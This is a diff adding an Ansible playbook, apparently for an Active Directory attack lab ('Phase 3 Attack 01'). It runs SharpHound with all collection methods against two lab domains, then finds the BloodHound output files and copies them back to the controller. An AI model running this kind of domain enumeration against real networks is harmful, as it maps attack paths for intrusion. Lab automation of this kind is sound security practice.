@@ -1,0 +1,48 @@
+- name: Capture SharpHound stdout for Phase 3 Attack 01
+  hosts: braavos
+  gather_facts: false
+  tasks:
+    - name: Run SharpHound against sevenkingdoms.local
+      ansible.windows.win_shell: >-
+        .\SharpHound.exe -c All -d sevenkingdoms.local
+        --OutputDirectory C:\attacks\bloodhound-sevenkingdoms
+      args:
+        chdir: C:\attacks
+      register: sharphound_root
+      failed_when: false
+
+    - name: Show sevenkingdoms.local SharpHound output
+      ansible.builtin.debug:
+        var: sharphound_root
+
+    - name: Run SharpHound against north.sevenkingdoms.local
+      ansible.windows.win_shell: >-
+        .\SharpHound.exe -c All -d north.sevenkingdoms.local
+        --OutputDirectory C:\attacks\bloodhound-north
+      args:
+        chdir: C:\attacks
+      register: sharphound_north
+      failed_when: false
+
+    - name: Show north.sevenkingdoms.local SharpHound output
+      ansible.builtin.debug:
+        var: sharphound_north
+
+    - name: Find BloodHound output files after capture run
+      ansible.windows.win_find:
+        paths:
+          - C:\attacks\bloodhound-sevenkingdoms
+          - C:\attacks\bloodhound-north
+        patterns:
+          - '*.zip'
+          - '*.json'
+          - '*.bin'
+        recurse: true
+      register: bloodhound_outputs
+
+    - name: Fetch BloodHound output files after capture run
+      ansible.builtin.fetch:
+        src: "{{ item.path }}"
+        dest: /tmp/phase3-attack01/
+        flat: true
+      loop: "{{ bloodhound_outputs.files }}"
